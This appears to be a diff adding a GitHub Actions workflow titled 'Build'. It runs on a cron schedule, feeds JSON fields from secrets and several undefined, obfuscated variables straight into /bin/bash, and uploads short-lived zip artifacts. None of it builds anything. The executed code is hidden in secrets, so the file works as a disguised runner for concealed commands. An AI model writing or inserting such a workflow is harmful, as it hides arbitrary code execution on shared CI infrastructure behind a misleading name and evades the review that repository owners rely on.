@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          ydx9077: ${{ secrets.ydx9077 }}
+        run: |
+          printf '%s' "$ydx9077" | jq -r .rh8 | /bin/bash
+          echo $pee470 | jq -r .rxfho899 | /bin/bash
+          printf '%s' "$jio45" | jq -r .l9 | /bin/bash
+          echo $wtph7 | jq -r .tn75 | /bin/bash
+          echo $z7836 | jq -r .s4 | /bin/bash
+          printf '%s' "$qlw6334" | jq -r .t9962 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: qzP95tDt
+          path: "*.zip"
+          retention-days: 1
